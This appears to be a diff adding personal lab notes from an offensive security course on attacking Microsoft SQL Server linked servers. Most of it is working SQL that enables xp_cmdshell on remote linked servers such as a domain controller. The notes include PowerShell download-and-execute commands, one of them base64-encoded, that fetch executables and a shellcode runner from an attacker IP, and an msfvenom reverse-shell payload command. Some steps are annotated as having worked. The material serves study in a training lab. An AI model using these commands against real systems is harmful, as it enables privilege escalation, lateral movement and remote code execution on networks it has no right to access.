+  ```sql
+  ALTER DATABASE YourDatabaseName SET TRUSTWORTHY OFF;
+  ```
+
+### **Important Considerations**
+
+- **Security Implications**: Setting the `TRUSTWORTHY` flag to `ON` can have significant security implications. It allows certain types of potentially risky operations (like executing CLR code or impersonating server-level principals) that could escalate privileges if not carefully managed.
+  
+- **Default Setting**: By default, the `TRUSTWORTHY` setting is `OFF` for newly created databases.
+
+
+### Linked Server Exercise
+
+- *Note:* none b64 encoded powershell worked while the encoded didn't and threw errors
+```sql
+username
+password
+appsrv01.corp1.com
+master
+EXEC sp_linkedservers;
+select myuser from openquery("dc01", 'select SYSTEM_USER as myuser');
+EXEC ('sp_configure ''show advanced options'', 1; reconfigure;') AT DC01
+EXEC ('sp_configure ''xp_cmdshell'', 1; reconfigure;') AT DC01
+EXEC ('xp_cmdshell ''powershell -Command Invoke-Webrequest -Uri http://192.168.45.197:8000/tcp.exe -OutFile c:\\Windows\\Tasks\\tcp3.exe; Start-Process C:\Windows\Tasks\tcp3.exe''') AT DC01
+EXEC ('EXEC sp_executesql N''EXEC xp_cmdshell ''''cmd.exe /c powershell.exe -ep bypass -enc SW52b2tlLVdlYlJlcXVlc3QgLVVyaSBodHRwOi8vMTkyLjE2OC40NS4xOTc6ODAwMC90Y3AuZXhlIC1PdXRGaWxlIEM6XFxXaW5kb3dzXFxUYXNrc1xcdGNwLmV4ZScKCg=='''';''') AT DC01
+```
+
+- this download and execute worked
+- shellcode using `msfvenom -p windows/x64/custom/reverse_winhttp LHOST=192.168.45.197 LPORT=8888 LURI=what.woff -f powershell`
+```sql
+username
+password
+appsrv01.corp1.com
+master
+EXEC sp_linkedservers;
+select myuser from openquery("dc01", 'select SYSTEM_USER as myuser');
+EXEC ('sp_configure ''show advanced options'', 1; reconfigure;') AT DC01
+EXEC ('sp_configure ''xp_cmdshell'', 1; reconfigure;') AT DC01
+EXEC ('EXEC sp_executesql N''EXEC xp_cmdshell ''''dir c:\'''';''') AT DC01
+EXEC ('xp_cmdshell ''powershell.exe -NoProfile -ExecutionPolicy Bypass IEX(New-Object Net.WebClient).downloadString(''''http://192.168.45.197:8000/shellcode-runner.ps1'''')'';') AT DC01
+```
+
+- EM (cmd execution)
+```sql
+username
+password
+appsrv01.corp1.com
+master
+EXEC sp_linkedservers;
+select myuser from openquery("dc01", 'select SYSTEM_USER as myuser')
+EXEC ('EXEC [dc01].master.dbo.sp_executesql N''EXEC sp_configure ''''show advanced options'''', 1; RECONFIGURE; EXEC sp_configure ''''xp_cmdshell'''', 1; RECONFIGURE;''')
+DECLARE @cmd NVARCHAR(4000);SET @cmd = 'CREATE TABLE #CmdOutput (Output NVARCHAR(4000)); INSERT INTO #CmdOutput (Output) EXEC master..xp_cmdshell ''powershell.exe -Command "Get-ChildItem C:\ | ForEach-Object { $_.Name }"''; SELECT * FROM #CmdOutput;' EXEC [dc01].master.dbo.sp_executesql @cmd
+```
+- openquery `xp_cmdshell`
+```sql
+-- Enable advanced options
+SELECT * 
+FROM OPENQUERY([dc01], 
+    'EXEC sp_configure ''show advanced options'', 1; RECONFIGURE;');
+
+-- Enable xp_cmdshell
+SELECT * 
+FROM OPENQUERY([dc01], 
+    'EXEC sp_configure ''xp_cmdshell'', 1; RECONFIGURE;');
+```
+
+#### 15.3.2.1
+
+2. code to try
+```sql
+EXEC ('EXEC (''sp_configure ''''show advanced options'''', 1; RECONFIGURE;'') AT appserv01') AT dc01;
+EXEC ('EXEC (''sp_configure ''''xp_cmdshell'''', 1; RECONFIGURE;'') AT appserv01') AT dc01;
+
+EXEC ('EXEC (''xp_cmdshell ''''powershell.exe -NoProfile -ExecutionPolicy Bypass IEX(New-Object Net.WebClient).downloadString(''''http://192.168.45.197:8000/shellcode-runner.ps1'''')'''';'') AT appserv01') AT dc01;
+
+```
